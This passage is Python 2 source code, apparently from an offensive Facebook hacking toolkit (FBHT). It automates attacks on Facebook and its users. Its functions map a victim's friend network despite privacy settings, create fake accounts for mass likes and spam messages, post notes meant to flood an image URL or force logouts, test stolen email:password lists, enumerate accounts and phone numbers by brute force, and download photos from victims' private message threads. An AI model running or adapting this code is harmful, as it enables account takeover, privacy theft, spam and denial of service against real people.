        #Offset represents the start offset for non-repetition purpose
        offset = 0
        
        #Controls the end of the module excecution
        NoneFlag = True
        
        #Search for friends to be added
        for element in range(len(json_dump['jsmods']['require'])):
            if json_dump['jsmods']['require'][element][0] == unicode('AddFriendButton'):
                NoneFlag = False
                offset += 1
                extendedFriends.append(json_dump['jsmods']['require'][element][3][1])
        
        #If no friend was added, the excecution ends
        if NoneFlag:
            break
        
        #Increments offset from the start in the search
        start += offset 
        
    #End of the while, returns the new list   
    return extendedFriends


def getUserID(user):
#Grabs the user Id using the OpenGraph
    try:
        response = br.open('https://graph.facebook.com/'+str(user))
        resultado = response.read()
        json_dump = json.loads(resultado)
        try:
            return json_dump['id']
        except:
            return -1
    
    except mechanize.HTTPError as e:
            print e.code
            return -1
    except mechanize.URLError as e:
            print e.reason.args
            return -1
    
def logs(messagelog):
    
    logging.basicConfig(filename=os.path.join("logs","error.log"), level=logging.NOTSET, format='')
    cTime = ctime(time())
    log = str(cTime) + ' : ' + str(messagelog)
    logging.debug(log)
    
    
def dotFile(victim, transitive):

    root = 'dumps'
    directory = str(victim)
    
    mkdir(directory,root)
    
    myGraph = open( os.path.join(root,directory,victim+"_dot.dot") ,"wb")
    myGraph.write('Graph {\n')
    
    #Percentage container
    percentage = 0.0
    #Disclosude friends container
    friendships = []
    #Already visited nodes container
    visited = []  
    try:
        #If the file already exists 
        friendshipFile = open( os.path.join(root,directory,victim+".txt") ,"rb")
        #Reads every line of the file
        while True:
            linea = friendshipFile.readline()
            if not linea:
                break
            #Store in the visited array for non repetition
            visited.append(linea.strip("\n\r"))
        friendshipFile.close()

    except:
        #If the file does not exists, creates the file
        friendshipFile = open( os.path.join(root,directory,victim+".txt") ,"wb")
        friendshipFile.close()
     
    
    try:
        #Generates the first level of the search
        result = coreFriendshipPrivacy(victim,transitive)
    except:
        print 'Check the internet connection please..'
        return
    
    #Stores non repetitive values in the disclosed friends container
    transitivo = getName(transitive)
    for individuos in result:
        if individuos not in visited:
            chabon = getName(individuos)
            myGraph.write('    "'+transitivo + '" -> "' + chabon + '";\n')          
            friendships.append(individuos)
    visited.append(getUserID(transitive))
    #Counter for percentage calculus purpose 
    i = 0.0
    #flush
    print '\r                                                        \r',
    #For every value in the first disclosed list, repeats until every value has been tried    
    for friends in friendships:
        #Percentage calculus 
        percentage = (i * 100.0)/len(friendships)
        
        print '\rIterating on %d of %d - [%.2f%%] completed\r' %(i ,len(friendships), percentage), 
        i+=1
        #Only if the node wasn't visited 
        if friends not in visited:
            #if coreFriendshipPrivacy() fails, an exception is caught. Therefore, state will still be True. 
            #Only if the try passes, the infinite while will end. (For internet error connection problem)
            state = True
            while state == True:
                try:
                    result = coreFriendshipPrivacy(victim,friends)
                    state = False
                except signalCaught as e:
                    state = False
                    print 'Signal Caught handler'
                    print '%s ' %e.args[0]
                    return
                except:
                    logs('Check the internet connection please.. Press enter when it\'s done')
                    print '\r                                                                       \r',
                    a = raw_input('\rCheck the internet connection please.. Press enter when it\'s done\r')
                    if a == 1:
                        state = False
                    else:
                        if a == 2:
                            email,password = setMail()
                            login(email,password,'real')
            
            #Stores non repetitive values in the disclosed friends container
            friendName = getName(friends)    
            for element in result:
                if element not in friendships:
                    transitive = getName(element)
                    myGraph.write('    "'+friendName + '" -> "' + transitive + '";\n')
                    friendships.append(element)
            
            #Stores every single value of friendships list already analysed for non repetitiveness
            visited.append(friends)
            
    #Check if the file exists, if true append, else create and writes
    try:
        friendshipFile = open( os.path.join(root,directory,victim+".txt") ,"ab")
    except:
        friendshipFile = open( os.path.join(root,directory,victim+".txt") ,"wb")
        
    #Stores every userID for further analysis
    for friends in friendships:
        transitivo = getName(friends)
        myGraph.write('    "'+victim + '" -> "' + transitivo + '";\n')
        friendshipFile.write(str(friends)+'\n')
    
    myGraph.write('}')
    friendshipFile.close()
    myGraph.close()

def simpleDotGraph(friends, victim):
    root = 'dumps'
    directory = str(victim)
    
    mkdir(directory,root)
    
    myGraph = open( os.path.join(root,directory,victim+"_dot.dot"),"wb")
    myGraph.write('Graph    {\n')
    
  
    friendshipFile = open( os.path.join(root,directory,victim+".txt"),"wb")
    for friend in friends:
        friendshipFile.write(str(friend)+'\n')
    friendshipFile.close()
    
    
    for friend in friends:
        try:
            mutual = coreFriendshipPrivacy(victim, friend)
        except:
            continue
        
              
        transitive = getName(friend)
            
        myGraph.write('    "'+victim + '" -> "' + transitive + '";\n')
        
        for element in mutual:

            mutualFriend = getName(element)
                
            myGraph.write('    "'+transitive + '" -> "' + mutualFriend + '";\n')

    myGraph.write('}')    
    myGraph.close()
    
def noteDDoS(imageURL,noteID, privacy):
    
    fb_dtsg = set_dtsg()
    if (fb_dtsg == 0):
        print 'ERROR MOTHER FUCKER -_-'
           
    j = int(raw_input('starting parameter number? (img.jpg?file=number) : '))
    amount = int(raw_input('last parameter number? (img.jpg?file=number) : '))
    title = raw_input('Note title: ')
    content = '<p>' + raw_input('Note preview text: ') + '</p>' 
    for i in range(j,int(amount)):
        content += '<p><img src="'+imageURL+'?file='+str(i)+'"></img></p>'
        
    arguments = {
        'fb_dtsg' : fb_dtsg,
        'object_id' : noteID,
        'note_id' : noteID,
        'id' : getC_user(),
        'title' : title,
        'note_content' : content,
        'audience['+noteID+'][value]' : privacy,
        'publish' : 'Publish',
        '__user' : getC_user(),
        '__a' : '1',
        '__dyn' : '7n8ahyj34fzpQ9UoHaEWy1m9ACwKyaF3pqzCAjFDxCm6qyE',
        '__req' : '7',
        'ttstamp' : '2658169897154120115496511690',
        '__rev' : '1224624'
        }
    
    datos = urlencode(arguments)
    try:
        response = br.open('https://www.facebook.com/ajax/notes/edit',datos)
    except mechanize.HTTPError as e:
        logs(e.code)
        print e.code
    except mechanize.URLError as e:
        logs(e.reason.args)
        print e.reason.args    
    except:
        logs('Error in the DDoS module')
        print '\rError in the DDoS module\r'
        raise
    
def devTest(appID):
    try:
        fb_dtsg = set_dtsg()
        if (fb_dtsg == 0):
            print 'ERROR MOTHER FUCKER -_-'
            
        br.open('https://developers.facebook.com/').read()
        arguments = {   
            'fb_dtsg' : fb_dtsg,
            'count' : '4',
            'app_id' : str(appID),
            'install_app' : '1',
            'platform_version' : 'v2.0',
            'enable_ticker' : '1',
            'language' : 'en_US',
            '__user' : getC_user(), 
            '__a' : '1',
            '__dyn' : '7w86i1PyUnxqnFwn8',
            '__req' : '3',
            'ttstamp' : '2658172110116109767311810511273',
            '__rev' : '1262242'
            }
        
        datos = urlencode(arguments)
        
        response = br.open('https://developers.facebook.com/apps/async/test-users/create/',datos)
    except mechanize.HTTPError as e:
        logs(e.code)
        print e.code
    except mechanize.URLError as e:
        logs(e.reason.args)
        print e.reason.args    
    except:
        logs('Error in devTest module')
        print '\rError in devTest module\r'
        raise
'''    
def getTest(appID):
    try:
        response = br.open('https://developers.facebook.com/apps/'+appID+'/roles/test-users/')
        
        linea = response.read()
        lines = []
        
        match = re.search('test_users'+'(.+)',linea)
        if match is not None:
            encontrada =  match.group()
        
        start = 0
        while True:
            matchstart = re.search('test_user_ids',encontrada[start:])
            if matchstart is not None:
                matchend = re.search('\.net',encontrada[start+matchstart.end():])
                if (matchstart is not None) and (matchend is not None):
                    final = encontrada[start+matchstart.start() : matchend.end()+start+matchstart.end()]
                    lines.append(final)
                    start = start+matchstart.start()+matchend.end()
            else:
                break
        
        email = []
        name = []
        userid = []
        for linea in lines:
            matchstart =re.search('value="',linea)
            matchend = re.search('"',linea[matchstart.end():])
            userid.append(linea[matchstart.end():matchstart.end()+matchend.start()])
        for linea in lines:
            start=0
            while True:
                matchstart = re.search("\"_50f4\">",linea[start:])
                if matchstart is not None:
                    matchend = re.search('</span>',linea[start+matchstart.end():])
                    if (matchstart is not None) and (matchend is not None):
                        final = linea[start+matchstart.end() : matchend.start()+start+matchstart.end()]
                        name.append(final)
                        start = start+matchstart.start()+matchend.end()
                        matchstart = re.search("_5jxf\"><span class=\"_50f4\">",linea[start:])
                        if matchstart is not None:
                            email.append(linea[matchstart.end()+start:].replace('&#064;','@'))
                            break
                        else:
                            print 'error'
                else:
                    break
    
        for elements in email:
            print elements
        for elements in name:
            print elements
        for elements in userid:
            print elements
        
    except mechanize.HTTPError as e:
        logs(e.code)
        print e.code
    except mechanize.URLError as e:
        logs(e.reason.args)
        print e.reason.args    
    except:
        logs('Error in getTest module')
        print '\rError in getTest module\r'
        raise 
'''
def getTest(appID):
    try:
        start = 0
        flag = 0
        while flag != -1:
            
            fb_dtsg = set_dtsg()
            if (fb_dtsg == 0):
                print 'ERROR MOTHER FUCKER -_-'
                
            arguments = {   
                'start' : str(start),
                '__user' : getC_user(),
                '__a' : '1',
                '__dyn' : '7w86i1PyUnxqnFwn8',
                '__req' : '4',
                'fb_dtsg' : fb_dtsg,
                'ttstamp' : '26581707111311350113871144898',
                '__rev' : '1262242'
            }
            datos = urlencode(arguments)
            try:
                response = br.open('https://developers.facebook.com/apps/'+appID+'/roles/test-users/paging/',datos)
                aParsear = response.read().strip("for (;;);")
                json_dump = json.loads(aParsear)
                flag = MyParser.parceros(json_dump)
                start+=20
            except:
                break
    except:
        print 'general error'

def changePassword(appID):        
    people = database.getUsers()
    peopleLogged = database.getUsersNotLogged()
    for persona in people:
        if persona in peopleLogged:
            try:
                fb_dtsg = set_dtsg()
                if (fb_dtsg == 0):
                    print 'ERROR MOTHER FUCKER -_-'
                    
                arguments = { 
                    'fb_dtsg' : fb_dtsg,  
                    'name' : str(persona[1]),
                    'password' : '1234567890',
                    'confirm_password' : '1234567890',
                    '__user' : getC_user(),
                    '__a' : '1',
                    '__dyn' : '7w86i1PyUnxqnFwn8',
                    '__req' : 'a',
                    'ttstamp' : '26581698582558910610211811276',
                    '__rev' : '1262776'
                }
                datos = urlencode(arguments)
                try:
                    response = br.open('https://developers.facebook.com/apps/async/test-users/edit/?app_id='+appID+'&test_user_id='+str(persona[0]),datos)
                except:
                    print 'error'
            except:
                print 'Error General'
        
        
        
def likeDev(postId):
        
    signal.signal(signal.SIGINT, signal_handler)
    try:
        #Cookie of the real account
        masterCookie = cj._cookies
        massLoginTest()
        
        if len(cookieArray) == 0:
            print 'First you must create accounts: option 1) '
        
        quantity = raw_input('Insert the amount of likes: ')
        
        while int(quantity) <= 0 or int(quantity) >= len(cookieArray):
            print 'Wrong quantity. First you must create enough accounts for that amount of likes .. (option 1) ..'
            quantity = raw_input('Insert the amount of likes: ')
            

        #Percentage container
        percentage = 0.0
        j = 0.0
        total = int(quantity) * len(postId)
        #flush
        print '\r                                                        \r',
        
        for i in range(int(quantity)):
            for post in range(len(postId)):
                cj._cookies = cookieArray[i]
                c_user = getC_user()
                try:
                    fb_dtsg = set_dtsg()
                    if (fb_dtsg == 0):
                        print 'ERROR MOTHER FUCKER -_-'
                    
                    arguments = {
                        'like_action' : 'true',
                        'ft_ent_identifier' : str(postId[post]),
                        'source' : '0',
                        'client_id' : str(c_user)+'%3A4047576437',
                        'rootid' : 'u_0_2o',
                        'giftoccasion' : '',
                        'ft[tn]' : '%3E%3D',
                        'ft[type]' : '20',
                        'nctr[_mod]' : 'pagelet_timeline_recent',
                        '__user' : c_user,
                        '__a' : '1',
                        '__dyn' : '7n8ahyj35ym3KiA',
                        '__req' : 'c',
                        'fb_dtsg' : fb_dtsg,
                        'phstamp' : '165816595797611370260',
                    }
                    
                                
                    datos = urlencode(arguments)
                    response = br.open('https://www.facebook.com/ajax/ufi/like.php',datos)
                    
                    if globalLogging:
                        logs(response.read())
                    
                    percentage = (j * 100.0)/total
                    print '\r[%.2f%%] of likes completed\r' %(percentage), 
                    j+=1
                        
                except mechanize.HTTPError as e:
                    print e.code
                    
                except mechanize.URLError as e:
                        print e.reason.args  
                except:
                    print 'Unknown error' 
            
        cj._cookies = masterCookie           
        raw_input('Finished like() module, press enter to continue')
    except signalCaught as e:
        deleteUser()
        message = '%s catch from create module' %e.args[0]
        logs(str(message))
        print '%s \n' %message
        raw_input('Press enter to continue')
        return

def massMessage(page,message):
    import random
    
    massLoginTest()
    
    if len(cookieArray) == 0:
        print 'First you must create accounts: option 1) '
        return
    
    pageID = getUserID(page)
    
    for i in range(len(cookieArray)):
        try:
            cj._cookies = cookieArray[i]
            c_user = getC_user()
            print str(c_user)+'\n'
            
            numero = ''
            numero2 = ''
            for i in range(10):
                numero += str(random.randrange(0,10))
            for i in range(10):
                numero2 += str(random.randrange(0,10))
                
            fb_dtsg = set_dtsg()
            if (fb_dtsg == 0):
                print 'ERROR MOTHER FUCKER -_-'
            arguments = {
                'message_batch[0][action_type]' : 'ma-type:user-generated-message',
                'message_batch[0][author]' : 'fbid:'+c_user,
                'message_batch[0][timestamp]' : '1401416840784',
                'message_batch[0][timestamp_absolute]' : 'Today',
                'message_batch[0][timestamp_relative]' : '11:27pm',
                'message_batch[0][timestamp_time_passed]' : '0',
                'message_batch[0][is_unread]' : 'false',
                'message_batch[0][is_cleared]' : 'false',
                'message_batch[0][is_forward]' : 'false',
                'message_batch[0][is_filtered_content]' : 'false',
                'message_batch[0][is_spoof_warning]' : 'false',
                'message_batch[0][source]' : 'source:titan:web',
                'message_batch[0][body]' : message,
                'message_batch[0][has_attachment]' : 'false',
                'message_batch[0][html_body]' : 'false',
                'message_batch[0][specific_to_list][0]' : 'fbid:'+pageID,
                'message_batch[0][specific_to_list][1]' : 'fbid:'+c_user,
                'message_batch[0][force_sms]' : 'true',
                'message_batch[0][ui_push_phase]' : 'V3',
                'message_batch[0][status]' : '0',
                'message_batch[0][message_id]' : '<1401416840784:'+numero+'-'+numero2+'@mail.projektitan.com>',
                '''<1401416840784:554304545-874733751@mail.projektitan.com>','''
                'message_batch[0][client_thread_id]' : 'user:'+pageID,
                'client' : 'mercury',
                '__user' : c_user,
                '__a' : '1',
                '__dyn' : '7n8ajEAMCBynUKt2u6aOGeExEW9ACxO4pbGA8AGGBy6C-Cu6popDFp4qu',
                '__req' : 'q',
                'fb_dtsg' : fb_dtsg,
                'ttstamp' : '26581697273111715585898748',
                '__rev' : '1268876'
                }
            
            datos = urlencode(arguments)
            response = br.open('https://www.facebook.com/ajax/mercury/send_messages.php',datos)
    
            if globalLogging:
                    logs(response.read())
        
        except mechanize.HTTPError as e:
            print e.code
        except mechanize.URLError as e:
                print e.reason.args  
                    
        except:
            logs('Error en el modulo de massMessage()')
            print 'Error en el modulo de massMessage()\n'


def logTestUser(testUser):
    try:
        fb_dtsg = set_dtsg()
        if (fb_dtsg == 0):
            print 'ERROR MOTHER FUCKER -_-'
        
        c_user = getC_user()
        arguments = {
            'user_id' : testUser,
            '__user' : c_user,
            '__a' : '1',
            '__dyn' : '7w86i3S2e4oK4pomXWo4CE-',
            '__req' : '2',
            'ttstamp' : '2658172826512290796710073107',
            '__rev' : '1270592',
            'fb_dtsg' : fb_dtsg,
            }
        datos = urlencode(arguments)
        response = br.open('https://developers.facebook.com/checkpoint/async/test-user-login/dialog/',datos)
        
        dump = json.loads(response.read().strip("for (;;);"))
        line = dump['jsmods']['markup'][0][1]['__html']
        match= re.search('\"n\"',line)
        if match != None:
            matchBis = re.search('value=\"',line[match.end():])
            matchBisBis = re.search('"',line[match.end()+matchBis.end():])
            code = line[match.end()+matchBis.end():match.end()+matchBis.end()+matchBisBis.start()]

        fb_dtsg = set_dtsg()
        if (fb_dtsg == 0):
            print 'ERROR MOTHER FUCKER -_-'

        arguments['fb_dtsg'] = fb_dtsg
        arguments['n'] = str(code)
        
        datos = urlencode(arguments)
        response = br.open('https://developers.facebook.com/checkpoint/async/test-user-login/',datos)

        if globalLogging:
                logs(response.read())
    
    except mechanize.HTTPError as e:
        print e.code
    except mechanize.URLError as e:
            print e.reason.args  

def massLoginTest():
    import copy
    i = int(0)
    people = database.getUsersNotLogged()
    #Flush
    print '\r                                                        \r',
    
    masterCj = copy.deepcopy(cj._cookies)
    loadPersistentCookie()

    for person in people:
        #login
        try:
            cj._cookies = copy.deepcopy(masterCj)
            if person[4] == 0:
                logTestUser(str(person[0]))
                cookieArray.append(cj._cookies)
                print cj._cookies #DEBUG
                cj.clear()
                    
            #percentage
            i+=1
            percentage = (i * 100.0) / len(people)
            print '\rCompleted [%.2f%%]\r'%percentage,
        except:
            print 'Error with user %s' %person[0]
            continue
    
    cj.clear()
    savePersistentCookie()   

def plotDOT(victim):
    root = 'dumps'
    directory = victim
    mkdir(directory,root)
    
    graph = open(root+"\\"+directory+"\\"+victim+"_graph.dot","wb")
    
    graph.write("Graph    {\n")
    
    victim = victim.replace(".","_")
    nodes = database.getNodes(victim)
    for node in nodes:
        
        graph.write("    "+victim.replace("_",".")+" -> "+node[0]+";\n")
        
        edges = database.getEdges(victim,node[0],node[1])
        try:
            edgeList = edges[0][2].split(';')
            writed = []
            for individual in edgeList:
                if individual != "" and individual not in writed:
                    graph.write("    "+node[0]+" -> "+str(individual)+";\n")
                    writed.append(individual)
        except:
            print 'No edges for %s' %node[0]
            
    graph.write("}")
    graph.close()
    
def dotFileDatabase(victim, transitive):

    #Percentage container
    percentage = 0.0
    #Disclosude friends container
    friendships = []
    #Already visited nodes container
    visited = []      
    
    try:
        #Generates the first level of the search
        result = coreFriendshipPrivacy(victim,transitive)
    except:
        print 'Check the internet connection please..'
        return
    
    #Stores non repetitive values in the disclosed friends container
    transitivo = getName(transitive)
    transitivoID = getUserID(transitive)
    
    if transitivoID == -1:
        transitivoID = transitivo
    
    database.addNode(victim,transitivo, transitivoID)
        
    for individuos in result:
        friendName = getName(individuos)
        friendId = getUserID(individuos)
        
        if friendId == -1:
            friendId = friendName
               
        database.addNode(victim,friendName, friendId)
        database.addEdge(victim,transitivo, transitivoID, friendName, friendId)
        friendships.append(individuos)

    
    #Counter for percentage calculus purpose 
    i = 0.0
    #flush
    print '\r                                                        \r',
    #For every value in the first disclosed list, repeats until every value has been tryed    
    for friends in friendships:
        #Percentage calculus 
        percentage = (i * 100.0)/len(friendships)
        
        print '\rIterating on %d of %d - [%.2f%%] completed\r' %(i ,len(friendships), percentage), 
        i+=1
        #Only if the node wasn't visited 
        if friends not in visited:
            #if coreFriendshipPrivacy() fails, an exception is caught. Therefore, state wis still being True. 
            #Only if the try passes, the infinite while will end. (For internet error connection problem)
            state = True
            while state == True:
                try:
                    result = coreFriendshipPrivacy(victim,friends)
                    state = False
                except signalCaught as e:
                    state = False
                    print 'Signal Caught handler'
                    print '%s ' %e.args[0]
                    return
                except:
                    logs('Check the internet connection please.. Press enter when it\'s done')
                    print '\r                                                                       \r',
                    a = raw_input('\rCheck the internet connection please.. Press enter when it\'s done\r')
                    if a == 1:
                        state = False
                    else:
                        if a == 2:
                            email,password = setMail()
                            login(email,password,'real')
            
            #Stores non repetitive values in the disclosed friends container
            friendName = getName(friends)
            friendId = getUserID(friends)
        
            if friendId == -1:
                friendId = friendName 
            
            database.addNode(victim,friendName, friendId)
                
            for element in result:
                if element not in friendships:
                    
                    friendTran = getName(element)
                    friendTranId = getUserID(element)
                
                    if friendId == -1:
                        friendId = friendName 
                        
                    database.addNode(victim,friendTran, friendTranId)
                    database.addEdge(victim,friendName, friendId, friendTran, friendTranId)
                    friendships.append(element)
            #Stores every single value of friendships list alredy analyzed for non repetitivness
            visited.append(friends)
        
def simpleDotGraphDatabase(friends, victim):

    
    for friend in friends:
       
        try:
            mutual = coreFriendshipPrivacy(victim, friend)
        except:
            continue
        
              
        transitive = getName(friend)
        transitiveID = getUserID(friend)
        
        if transitiveID == -1:
            transitiveID = transitive
        
        database.addNode(victim,transitive, transitiveID)
        
        for element in mutual:

            mutualFriend = getName(element)
            mutualFriendID = getUserID(element)
            
            if mutualFriendID == -1:
                mutualFriendID = mutualFriend
            
            database.addNode(victim,mutualFriend, mutualFriendID)
            database.addEdge(victim,transitive, transitiveID, mutualFriend, mutualFriendID)
            
            

    
def friendlyLogout(noteID,privacy):
    
    fb_dtsg = set_dtsg()
    if (fb_dtsg == 0):
        print 'ERROR MOTHER FUCKER -_-'
        return 
    
    existence = raw_input("Share an existent infected note? 1|0: ")
    


    title = raw_input('Note title: ')
    content = ''
    for i in range(0,10):
        content += '<p><img src="http://www.facebook.com/n/?home.php&clk_loc=5&mid=72b01a8G5af400143243G0Gd4&bcode=1.1354826874.AbllucLcWqHQbSNM&n_m=hackedby@chinoogawa-'+str(i)+'"/></p>'
       
    arguments = {
        'fb_dtsg' : fb_dtsg,
        'object_id' : noteID,
        'note_id' : noteID,
        'id' : getC_user(),
        'title' : title,
        'note_content' : content,
        'audience['+noteID+'][value]' : privacy,
        'publish' : 'Publish',
        '__user' : getC_user(),
        '__a' : '1',
        '__dyn' : '7n8ahyj34fzpQ9UoHaEWy1m9ACwKyaF3pqzCAjFDxCm6qyE',
        '__req' : '7',
        'ttstamp' : '2658169897154120115496511690',
        '__rev' : '1224624'
        }
    
    datos = urlencode(arguments)
    try:
        response = br.open('https://www.facebook.com/ajax/notes/edit',datos)
    except mechanize.HTTPError as e:
        logs(e.code)
        print e.code
    except mechanize.URLError as e:
        logs(e.reason.args)
        print e.reason.args    
    except:
        logs('Error in the friendlyLogout module')
        print '\rError in the friendlyLogout module\r'
        raise
    
    arguments = {
        'fb_dtsg' : fb_dtsg,
        'app_id' : '2347471856',
        'redirect_uri' : 'https://www.facebook.com/',
        'display' : 'popup',
        'access_token' : '',
        'sdk' : '',
        'from_post' : '1',
        'e2e' : '{"submit_0":1409803100561}',
        'xhpc_context' : 'home',
        'xhpc_ismeta' : '1',
        'xhpc_timeline' : '',
        'xhpc_targetid' : getC_user(),
        'xhpc_publish_type' : '1',
        'xhpc_message_text' : '#FBHT rocks! #HackThePlanet! @chinoogawa  powered by @MkitArgentina ',
        'xhpc_message' : '#FBHT rocks! #HackThePlanet! @chinoogawa  powered by @MkitArgentina ',
        'is_explicit_place' : '',
        'composertags_place' : '',
        'composertags_place_name' : '',
        'tagger_session_id' : '1409803081',
        'action_type_id[0]' : '',
        'object_str[0]' : '',
        'object_id[0]' : '',
        'og_location_id[0]' : '',
        'hide_object_attachment' : '0',
        'og_suggestion_mechanism' : '',
        'og_suggestion_logging_data' : '',
        'icon_id' : '',
        'share_action_properties' : '{"object":"https:\/\/www.facebook.com\/notes\/'+getName(getC_user())+'\/'+noteID+'\/'+noteID+'"}',
        'share_action_type_id' : '400681216654175',
        'composertags_city' : '',
        'disable_location_sharing' : 'false',
        'composer_predicted_city' : '',
        'audience[0][row_updated_time]' : '1409803103',
        'audience[0][custom_value]' : privacy,
        'audience[0][value]' : '111',
        '__CONFIRM__' : '1',
        '__user' : getC_user(),
        '__a' : '1',
        '__dyn' : '7xu5V84Oi3S2e4oK4pomXWomwho4a',
        '__req' : '7',
        'ttstamp' : '26581715110910598979511876122',
        '__rev' : '1398396'
        }

    datos = urlencode(arguments)
    try:
        response = br.open('https://www.facebook.com/v1.0/dialog/share/submit',datos)
    except mechanize.HTTPError as e:
        logs(e.code)
        print e.code
    except mechanize.URLError as e:
        logs(e.reason.args)
        print e.reason.args    
    except:
        logs('Error in the friendlyLogout module')
        print '\rError in the friendlyLogout module\r'
        raise    

def takePhotos(threads):
    r = open(os.path.join("massive","fotos.txt"),"wb")
    fb_dtsg = set_dtsg()
    f = open(os.path.join("massive",threads),"r")
    threadList = []
    while True:
        linea = f.readline()
        if not linea:
            break
        threadList.append(str(linea.strip("\n")))
    
    i = 0
    
    for message in threadList:
        arguments = {
            'thread_id' : message,
            'offset' : '0',
            'limit' : '30',
            '__user' : getC_user(),
            '__a' : '1',
            '__dyn' : 'aJj2BW9t2lm9b88DgDDx2IGAKh9VoW9J6yUgByVbFkGQhbHz6C-CEy5pokAWAVbGFQiuaBKAqhB-imSCiZ3oyq4U',
            '__req' : '40',
            'fb_dtsg' : fb_dtsg,
            'ttstamp' : '265816973899779122887410295',
            '__rev' : '1458973'
            }
        
        datos = urlencode(arguments)
        try:
            response = br.open('https://www.facebook.com/ajax/messaging/attachments/sharedphotos.php',datos)
            text = response.read()
            r.write(text + '\n')
        except mechanize.HTTPError as e:
            logs(e.code)
            print e.code
        except mechanize.URLError as e:
            logs(e.reason.args)
            print e.reason.args    
        except:
            logs('Error in robo de fotos')
            print '\rError in robo de fotos\r'
            raise        
        
        try:
            to_parse = str(text).strip('for (;;);')
            resultado = json.loads(to_parse)
            
            URLS = []
            for element in resultado['payload']['imagesData'].keys():
                URLS.append(resultado['payload']['imagesData'][element]['URI'])
            
            for URL in URLS:
                fotos = open(os.path.join('massive','photos',str(int(time()))+'.jpg'),"wb")
                handler = br.open(URL)
                fotos.write(handler.read())
                fotos.close()
                i += 1
                
            URLS[:]
        except:
            print 'no attachment in thread'
        
    r.close()
    
def accountexists(mailList):
    
    password = '#FBHTEnumerateUsers'
    mails = []
    try:
        mailFile = open(os.path.join("PRIVATE",mailList),"r")
    except:
        print 'File %s doesn\'t exist' %mailList
        return 
    try:
        verified = open(os.path.join("PRIVATE","existence","verified.txt"),"a")
        verified.close()
    except:
        verified = open(os.path.join("PRIVATE","existence","verified.txt"),"w")
        verified.close()
        
    while True:
        line = mailFile.readline()
        if not line: break
        mails.append(line.strip('\n'))
    
    mailFile.close()
    
    for email in mails:
        cookieHandler = customCookies()
        # Empty the cookies
        cj.clear()
        # Access the login page to get the forms
        try:
            br.open('https://login.facebook.com/login.php')
            br.select_form(nr=0)
        except mechanize.HTTPError as e:
            logs(str(e.code) + ' on login module')
            print str(e.code) + ' on login module'
            continue
        except mechanize.URLError as e:
            logs(str(e.reason.args) + ' on login module')
            print str(e.reason.args) + ' on login module'
            continue
        except:
            logs("Can't Access the login.php form")
            print "\rCan't Access the login.php form\r"
            continue
            # Select the first form
        
            
        # Set email and pass to the form
        try:
            br.form['email'] = email
            br.form['pass'] = password
        except:
            logs("Something bad happen.. Couldn't set email and password")
            print "\rSomething bad happen.. Couldn't set email and password\r"
        # Send the form
        try:
            response = br.submit()
            line = response.read()
            match = re.search('Por favor, vuelve a introducir tu contrase',line)
            if match is not None:
                print email + ' Cuenta existente'
                verified = open(os.path.join("PRIVATE","existence","verified.txt"),"a")
                verified.write(email + '\n')
                verified.close()
            else:
                print email + ' Cuenta inexistente'
        except:
            logs('Fatal error while submitting the login form')
            print '\rFatal error while submitting the login form\r'

    verified.close()

def checkLogin(mailList):
    global blocked
    
    try:
        verified = open(os.path.join("PRIVATE","loggedin","Loggedin.txt"),"a")
    except:
        verified = open(os.path.join("PRIVATE","loggedin","Loggedin.txt"),"w")
    try:    
        mails = open(os.path.join("PRIVATE",mailList),"r")
    except:
        print '%s doesn\'t exist in PRIVATE folder' %mailList
        verified.close()
        return
    
    credenciales = {}
    while True:
        email = mails.readline()
        if not email: break
        index = email.find(":")
        if index != -1:
            credenciales[email[0:index]] = email[index+1:].strip('\n')
            
    for emails in credenciales.keys():
        if (login(emails,credenciales[emails],'real') != -1) or (blocked == 1):
            verified = open(os.path.join("PRIVATE","loggedin","Loggedin.txt"),"a")
            verified.write(emails+':'+credenciales[emails]+'\n')
            verified.close()
            print emails + ' valid email and passowrd!!! MOTHER KAKERRRRR :D '
            blocked = 0
        else:
            print emails + ' not valid email or password'
    
    try:
        verified.close()
    except:
        return

def steal():
    global blocked
    try:
        verified = open(os.path.join("PRIVATE","loggedin","Loggedin.txt"),"r")
    except:
        print 'File Loggedin.txt not found in loggedin folder, you should try it again!'
        return
    
    credenciales = {}
    while True:
        email = verified.readline()
        if not email: break
        index = email.find(":")
        if index != -1:
            credenciales[email[0:index]] = email[index+1:].strip('\n')
            
    for emails in credenciales.keys():
        if (login(emails,credenciales[emails],'real') != -1) or (blocked == 1):
            print emails + ' valid email and passowrd!!! MOTHER KAKERRRRR :D '
            if blocked == 1:
                blocked = 0
                print 'Account valid, but blocked due to location issues'
            else:
                check = checkPrivacy('me')
                friendList, friendsName = friendshipPlot(check,'me')
                fileThreads = open(os.path.join("massive","threads.txt"),"wb")
                for friends in friendList:
                    fileThreads.write(friends+'\n')
                fileThreads.close()
                takePhotos("threads.txt")
        else:
            sleep(10)
            print emails + ' not valid email or password'
            
def bruteforceCel(first,start,end):
    c_user = getC_user()
    try:
        f = open('cellphones\\cellphones.txt','a')
        f.close()
    except:
        f = open('cellphones\\cellphones.txt','wb')
        f.close()
    percentage = 0.0
    verified = 0
    for cellphone in range(int(start),int(end)):
        percentage = ((cellphone-int(start)) * 100.0) / (int(end) - int(start))
        print '\rCompleted [%.6f%%] - %d cellphone - %d verified\r' %(percentage, cellphone, verified),
        try:
            response = br.open('https://www.facebook.com/typeahead/search/facebar/query/?value=["'+first+str(cellphone)+'"]&context=facebar&grammar_version=7466c20ac89f47d6185f3a651461c1b1bac9a82d&content_search_mode&viewer='+c_user+'&rsp=search&qid=8&max_results=10&sid=0.24097281275317073&__user='+c_user+'&__a=1&__dyn=7nmajEyl2qm9udDgDxyIGzGpUW9ACxO4p9GgyimEVFLFwxBxCbzESu49UJ6K59poW8xHzoyfw&__req=1o&__rev=1536505')
            text = response.read()
            json_dump = json.loads(text.strip('for (;;);'))
            #print str(json_dump['payload']['entities'][0]['path'])
            #print str(json_dump['payload']['entities'][0]['uid'])
            #print first + str(cellphone)
            f = open('cellphones\\cellphones.txt','a')
            f.write(first + str(cellphone)+' '+str(json_dump['payload']['entities'][0]['path']) + ' ' + str(json_dump['payload']['entities'][0]['uid'])+'\n')
            f.close()
            verified += 1
        except mechanize.HTTPError as e:
            logs(e.code)
            print e.code
        except mechanize.URLError as e:
            logs(e.reason.args)
            print e.reason.args    
        except:
            f.close()
            continue